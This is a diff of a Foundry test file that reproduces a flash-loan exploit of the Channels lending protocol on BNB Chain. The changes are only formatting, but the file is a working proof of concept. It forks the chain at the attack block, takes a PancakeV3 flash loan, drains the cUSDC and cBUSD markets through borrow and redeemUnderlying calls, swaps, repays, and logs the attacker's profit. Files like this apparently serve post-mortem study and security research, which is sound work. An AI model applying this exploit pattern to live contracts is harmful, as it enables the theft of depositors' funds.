@@ -14,21 +14,27 @@ import "../basetest.sol";
 
 // @Analysis
 // Post-mortem : https://app.blocksec.com/explorer/tx/bsc/0xcf729a9392b0960cd315d7d49f53640f000ca6b8a0bd91866af5821fdf36afc5
-// Twitter Guy : 
-// Hacking God : 
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
 interface IChannel {
-    function accrueInterest() external returns (uint);
-    function borrow(uint256) external returns (uint256);
-    function redeemUnderlying(uint256) external returns (uint256);
+    function accrueInterest() external returns (uint256);
+    function borrow(
+        uint256
+    ) external returns (uint256);
+    function redeemUnderlying(
+        uint256
+    ) external returns (uint256);
 }
 
 interface IComptroller {
-    function enterMarkets(address[] memory) external;
+    function enterMarkets(
+        address[] memory
+    ) external;
     function claimComp(address, address[] memory) external;
 }
 
@@ -37,7 +43,9 @@ interface IPancakePool {
 }
 
 interface IMint {
-    function mint(address) external returns (uint);
+    function mint(
+        address
+    ) external returns (uint256);
 }
 
 struct Pancke_ExactOutputParams {
@@ -49,7 +57,9 @@ struct Pancke_ExactOutputParams {
 }
 
 interface PancakeRouter {
-    function exactOutput(Pancke_ExactOutputParams calldata) external returns (uint256);
+    function exactOutput(
+        Pancke_ExactOutputParams calldata
+    ) external returns (uint256);
 }
 
 contract Channels is BaseTestWithBalanceLog {
@@ -71,15 +81,15 @@ contract Channels is BaseTestWithBalanceLog {
     address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
 
     address anon = 0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c;
-    
+
     address pancake_swap = 0xF45cd219aEF8618A92BAa7aD848364a158a24F33;
     address pancake_router = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
 
     address ac = 0x93790C641D029D1cBd779D87b88f67704B6A8F4C;
 
     function setUp() external {
-        cheats.createSelectFork("bsc", 34847596-1);
-        deal(cake, address(this), 1e18); 
+        cheats.createSelectFork("bsc", 34_847_596 - 1);
+        deal(cake, address(this), 1e18);
         deal(ac, address(this), 2);
     }
 
@@ -87,11 +97,16 @@ contract Channels is BaseTestWithBalanceLog {
         uint256 init = IERC20(busd).balanceOf(address(this));
         uint256 init_usdc = IERC20(cudsc_underlying).balanceOf(address(this));
 
-        IPancakePool(pancakeV3Pool).flash(address(this), 1000000000000000000, 42218672818223010583114, "0x0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000008f0adc86c0efe5c924a");
+        IPancakePool(pancakeV3Pool).flash(
+            address(this),
+            1_000_000_000_000_000_000,
+            42_218_672_818_223_010_583_114,
+            "0x0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000008f0adc86c0efe5c924a"
+        );
         uint256 after_attack = IERC20(busd).balanceOf(address(this));
         uint256 after_attack_usdc = IERC20(cudsc_underlying).balanceOf(address(this));
-        emit log_named_decimal_uint("Attacker BUSD end exploited", after_attack-init, 18);
-        emit log_named_decimal_uint("Attacker USDC end exploited", after_attack_usdc-init_usdc, 18);
+        emit log_named_decimal_uint("Attacker BUSD end exploited", after_attack - init, 18);
+        emit log_named_decimal_uint("Attacker USDC end exploited", after_attack_usdc - init_usdc, 18);
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
@@ -113,37 +128,33 @@ contract Channels is BaseTestWithBalanceLog {
 
         IChannel(cusdc).borrow(IERC20(cudsc_underlying).balanceOf(cusdc));
         IChannel(cbusd).borrow(IERC20(busd_underlying).balanceOf(cbusd));
-        IChannel(channels1).redeemUnderlying(174494827409609936689); // busd_btcb balance - 1
+        IChannel(channels1).redeemUnderlying(174_494_827_409_609_936_689); // busd_btcb balance - 1
 
         IERC20(pancake_swap).transfer(pancake_swap, IERC20(pancake_swap).balanceOf(address(this)));
         (uint256 amount0, uint256 amount1) = IUniswapV2Pair(pancake_swap).burn(address(this));
 
         address token1 = btcb;
-        uint24 fee1 = 500; 
+        uint24 fee1 = 500;
 
         address token2 = wbnb;
-        uint24 fee2 = 500; 
+        uint24 fee2 = 500;
 
         address token3 = cudsc_underlying;
-        bytes memory path = abi.encodePacked(
-            token1, fee1,
-            token2, fee2,
-            token3
-        );
+        bytes memory path = abi.encodePacked(token1, fee1, token2, fee2, token3);
 
         Pancke_ExactOutputParams memory params = Pancke_ExactOutputParams({
             path: path,
-            recipient: address(this),  
+            recipient: address(this),
             deadline: block.timestamp,
-            amountOut: 503715695155049,            
+            amountOut: 503_715_695_155_049,
             amountInMaximum: type(uint256).max
         });
 
         IERC20(cudsc_underlying).approve(pancake_router, type(uint256).max);
         uint256 amountin = PancakeRouter(pancake_router).exactOutput(params);
         // payback
-        IERC20(btcb).transfer(pancakeV3Pool, 1000500000000000000);
-        IERC20(busd).transfer(pancakeV3Pool, 42239782154632122088406);
+        IERC20(btcb).transfer(pancakeV3Pool, 1_000_500_000_000_000_000);
+        IERC20(busd).transfer(pancakeV3Pool, 42_239_782_154_632_122_088_406);
     }
 
     fallback() external payable {}
